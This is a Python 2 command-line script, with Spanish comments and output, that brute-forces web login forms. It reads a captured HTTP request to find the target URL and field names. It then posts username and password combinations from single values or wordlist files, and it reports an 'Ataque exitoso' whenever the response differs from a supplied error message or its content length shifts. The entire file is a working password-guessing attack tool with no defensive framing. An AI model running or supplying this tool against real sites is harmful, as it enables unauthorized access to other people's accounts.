#!/usr/bin/python

import re
import sys
import requests
import argparse
import os.path

arg = ''
reqFile = ''
user = ''
pwd = ''
userField = ''
passField = ''
userFile = ''
passile = ''
message = ''
op = ''

def checkFile(reqFile,user,pwd,userFile,passFile,message):
	
	if os.path.exists(reqFile):
		fo = open(reqFile,'r')
		for line in fo:
			regex = re.compile(r'Referer\: (.*)')
			match = regex.search(line)
			try:
				if match.group():
					url = match.group(1)
			except:		
				regex = re.compile(r'(.*)(\=)(.*)(\&)(.*)(\=)(.*)')
				match = regex.search(line)
				try:
					if match.group():
						userField = match.group(1)
						passField = match.group(5)
				except:
					continue
		fo.close()
	
	
	
	if user == '' and pwd == '':
		doubleFile(url,userField,passField,user,pwd,userFile,passFile,message)
		print 'double'
		
	elif user == '' and passFile == '':
		usersFile(url,userField,passField,user,pwd,userFile,passFile,message)
		print 'users'
	
	elif userFile == '' and pwd == '':
		print 'entra pwd'
		pwdFile(url, userField, passField, user, pwd, userFile, passFile, message)
		
	elif userFile == '' and passFile == '':
		single(url,userField,passField,user,pwd,userFile,passFile,message)
		print 'single'
			


def single(url, userField, passField, user, pwd, userFile, pwdFile, message):
	#Antes del ataque
	
	mbefore = message	
	#Login
	req = requests.post(url)
	
	for key, value in (req.headers).iteritems():
		if key.startswith('content-length'):
			print value
			cb = value
			print cb
		else: 
			continue
	
	
	payload = { userField : user, passField: pwd}
	r = requests.post(url, data= payload)
	for key,value in (r.headers).iteritems():
		if key.startswith('content-length'):
			ca = value
			op = int(ca) - int(cb)
		else:
			continue			
	
	
	mafter =  r.text
	
	if mbefore in mafter or op>=110 and op<=120:
	
		print 'Ataque no exitoso con:'  + " User: " + user + " Password: " + pwd
	else:
		print "Ataque exitoso con:" + "User: " + user  + " Password: " + pwd

def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
	users = []
	if os.path.exists(userFile): #archivo con usuarios
		fo = open(userFile, 'r')
		for element in fo:
			users.append(element)
		fo.close()
		
		for i in range(0,len(users)):
			#Antes del ataque
			mbefore = message
			
			
			req = requests.post(url)
			for key, value in (req.headers).iteritems():
				if key.startswith('content-length'):
					cb = value
					#print value
				else: 
					continue
	
		
			#Login
			payload = { userField : users[i], passField: pwd}
			r = requests.post(url, data= payload)
			for key, value in (r.headers).iteritems():
				if key.startswith('content-length'):
					ca = value
					op = int(ca) - int(cb)
					#print op
				else: 
					continue
	
			#Login exitoso
			mafter =  r.text
			if mbefore in mafter or op <= 0 or op>=110 and op<=120:
				print 'Ataque no exitoso con:'  + " User: " + users[i] + " Password: " + pwd
			else:
				print "Ataque exitoso con:" + " User: " + users[i]  + " Password: " + pwd

def pwdFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
	print 'entra pwd'
	passwords = []
	if os.path.exists(pwdFile): #archivo con usuarios
		fo = open(pwdFile, 'r')
		for element in fo:
			passwords.append(element)
		fo.close()
		
		for i in range(0,len(passwords)):
			#Antes del ataque
			mbefore = message
		
			req = requests.post(url)
			for key, value in (req.headers).iteritems():
				if key.startswith('content-length'):
					cb = value
				
				else: 
					continue
	
			#Login
			payload = { userField : user, passField: passwords[i]}
			r = requests.post(url, data= payload)
			for key, value in (r.headers).iteritems():
				if key.startswith('content-length'):
					ca = value
					op = int(ca) - int(cb)
					
				else: 
					continue
	
	
			#Login exitoso
			mafter =  r.text
			if mbefore in mafter or op <= 0 or op>=110 and op<=120:
			
				print 'Ataque no exitoso con:'  + " User: " + user + " Password: " + passwords[i]
			else:
				print "Ataque exitoso con:" + " User: " + user  + " Password: " + passwords[i]


def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
	print 'double'
	users = []
	passwords = []
	i = 0
	j = 0
	
	if os.path.exists(userFile) and os.path.exists(pwdFile): # ambos archivos
		
		fo = open(userFile, 'r')
		for element in fo:
			users.append(element)
		fo.close()
		
		fo = open(pwdFile, 'r')
		for element in fo:
			passwords.append(element)
		fo.close()
		
		for i in range(0,len(users)):
			for j in range (0,len(passwords)):
				#Antes del ataque
				mbefore = message
				
				req = requests.post(url)
				for key, value in (req.headers).iteritems():
					if key.startswith('content-length'):
						cb = value
						#print value
					else: 
						continue
				#Login
				payload = { userField : users[i], passField: passwords[j]}
				
				r = requests.post(url, data= payload)
				for key, value in (r.headers).iteritems():
					if key.startswith('content-length'):
						ca = value
						op = int(ca) - int(cb)
						#print op
					else: 
						continue
	
				#Login exitoso
				mafter =  r.text
				
				if mbefore in mafter or op <= 0 or op>=110 and op<=120:
					print 'Ataque no exitoso con:'  + " User: " + users[i] , " Password: " + passwords[j]
				else:
					print "Ataque exitoso con:" + " User: " + users[i]  , " Password: " + passwords[j]
					
				j + 1
			i + 1




def getParams(arg):
	parser = argparse.ArgumentParser(description='Fuerza Bruta',
		formatter_class=argparse.ArgumentDefaultsHelpFormatter)

	parser.add_argument('-r', '--reqfile', help = 'File with HTTP request', required=True)
	parser.add_argument('-u', '--user', help = 'User account')
	parser.add_argument('-p', '--password', help='User\'s password')
	parser.add_argument('-U', '--users', help='File with users')
	parser.add_argument('-P', '--passwords', help='File with passwords')
	parser.add_argument('-m', '--message', help='Error message', required=True)
					
	options = parser.parse_args()
	
	
	if len(sys.argv) == 1:
		print parser.print_help()
	
	if options.user is None and options.password is None and options.users is not None and options.passwords is not None:
		checkFile(options.reqfile,'','',options.users,options.passwords,options.message)
	elif options.password is None and options.users is None and options.user is not None and options.passwords is not None:
		checkFile(options.reqfile,options.user,'','',options.passwords,options.message)
	elif options.user is None and options.passwords is None and options.users is not None and options.password is not None:
		checkFile(options.reqfile,'',options.password,options.users,'',options.message)
	if options.users is None and options.passwords is None and options.user is not None and options.password is not None:
		checkFile(options.reqfile,options.user,options.password,'','',options.message)	
	elif options.user is None and options.users is None or options.password is None and options.passwords is None:
		print parser.print_help()
		

		
getParams(arg)
